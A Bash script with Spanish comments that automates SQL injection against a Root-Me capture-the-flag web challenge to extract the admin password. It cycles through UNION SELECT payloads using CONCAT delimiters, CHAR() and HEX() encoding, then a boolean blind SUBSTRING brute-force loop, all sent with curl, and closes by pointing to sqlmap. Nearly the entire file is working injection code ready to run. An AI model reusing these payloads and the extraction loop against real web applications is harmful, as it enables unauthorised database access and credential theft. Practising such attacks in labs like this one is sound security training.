#!/bin/bash

# ================================================
# EVASIÓN DEL FILTRO - CH30
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  EVASIÓN DEL FILTRO - CH30${NC}"
echo -e "${BLUE}========================================${NC}"

# ============================================
# TÉCNICA 1: CONCAT con delimitadores
# ============================================

echo -e "\n${YELLOW}[+] Técnica 1: CONCAT con delimitadores${NC}"

for delim in "|||" "@@@" "###" "---" "==="; do
    echo -ne "  Probando $delim... "
    result=$(curl -s "$URL?action=membres&id=1' UNION SELECT 1,CONCAT('$delim',pass,'$delim'),3,4 FROM membres WHERE username='admin'#" \
        | grep -o "$delim.*$delim" | sed "s/$delim//g")
    
    if [ -n "$result" ]; then
        echo -e "${GREEN}✅ Encontrado: $result${NC}"
        echo -e "${GREEN}========================================${NC}"
        echo -e "${GREEN}  CONTRASEÑA: $result${NC}"
        echo -e "${GREEN}========================================${NC}"
        exit 0
    else
        echo -e "${RED}❌${NC}"
    fi
done

# ============================================
# TÉCNICA 2: CHAR() para construir caracteres
# ============================================

echo -e "\n${YELLOW}[+] Técnica 2: CHAR() para construir caracteres${NC}"
result2=$(curl -s "$URL?action=membres&id=1' UNION SELECT 1,CONCAT(CHAR(124),pass,CHAR(124)),3,4 FROM membres WHERE username='admin'#" \
    | grep -o "|.*|" | sed 's/|//g')

if [ -n "$result2" ]; then
    echo -e "${GREEN}✅ Encontrado: $result2${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}  CONTRASEÑA: $result2${NC}"
    echo -e "${GREEN}========================================${NC}"
    exit 0
else
    echo -e "${RED}❌ No se encontró nada${NC}"
fi

# ============================================
# TÉCNICA 3: HEX() para codificar
# ============================================

echo -e "\n${YELLOW}[+] Técnica 3: HEX() para codificar${NC}"
result3=$(curl -s "$URL?action=membres&id=1' UNION SELECT 1,HEX(pass),3,4 FROM membres WHERE username='admin'#" \
    | grep -v "login failed" | grep -v "Authentification" | grep -v "iframe" | grep -v "Membres" | grep -v "CREATE" | grep -v "strong" | grep -v "form" | grep -v "input" | grep -v "submit" | grep -v "html" | grep -v "header" | grep -v "body" | grep -v "title" | grep -v "link" | grep -v "script" | grep -v "style" | head -5)

if [ -n "$result3" ]; then
    echo -e "${GREEN}✅ Encontrado (HEX): $result3${NC}"
    echo -e "${GREEN}[!] Decodificar con: echo '$result3' | xxd -r -p${NC}"
    echo -e "${GREEN}========================================${NC}"
    exit 0
else
    echo -e "${RED}❌ No se encontró nada${NC}"
fi

# ============================================
# TÉCNICA 4: SUBSTRING (booleana)
# ============================================

echo -e "\n${YELLOW}[+] Técnica 4: SUBSTRING (booleana)${NC}"
echo -e "${BLUE}[!] Esta técnica es más lenta...${NC}"

PASSWORD=""
CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

for pos in {1..20}; do
    found=0
    for ((i=0; i<${#CHARS}; i++)); do
        char="${CHARS:$i:1}"
        response=$(curl -s "$URL?action=membres&id=1' AND SUBSTRING(pass,$pos,1)='$char" | grep -c "admin")
        if [ "$response" -gt 0 ]; then
            PASSWORD="${PASSWORD}${char}"
            echo -e "${GREEN}[✓] Posición $pos: '$char'${NC}"
            found=1
            break
        fi
    done
    if [ $found -eq 0 ]; then
        break
    fi
done

if [ -n "$PASSWORD" ]; then
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}  CONTRASEÑA: $PASSWORD${NC}"
    echo -e "${GREEN}========================================${NC}"
    exit 0
fi

# ============================================
# SI NADA FUNCIONA
# ============================================

echo -e "\n${RED}========================================${NC}"
echo -e "${RED}  NINGUNA TÉCNICA FUNCIONÓ${NC}"
echo -e "${RED}========================================${NC}"
echo -e "\n${YELLOW}[!] El filtro es muy estricto.${NC}"
echo -e "${YELLOW}[!] Prueba con sqlmap o métodos manuales avanzados.${NC}"
